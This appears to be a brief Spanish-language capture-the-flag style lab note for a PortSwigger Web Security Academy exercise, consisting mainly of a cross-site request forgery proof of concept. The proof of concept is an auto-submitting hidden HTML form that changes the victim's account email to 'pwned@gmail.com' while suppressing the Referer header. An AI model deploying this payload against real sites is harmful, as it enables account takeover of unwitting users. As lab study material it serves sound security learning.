## Objetivo:

![[Pasted image 20240520204403.png]]

## Solucion:

![[Pasted image 20240520204430.png]]

```
<!DOCTYPE html>

<html lang="en">

<head>

<meta charset="UTF-8">

<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Document</title>

<meta name="referrer" content="never" >

</head>

<body>

<form action="https://0acb006e04a8dad4804d218d007f004d.web-security-academy.net/my-account/change-email" method="post">

<input type="hidden" name="email" value="pwned@gmail.com" />

</form>

<script>

document.forms[0].submit()

</script>

</body>

</html>
```
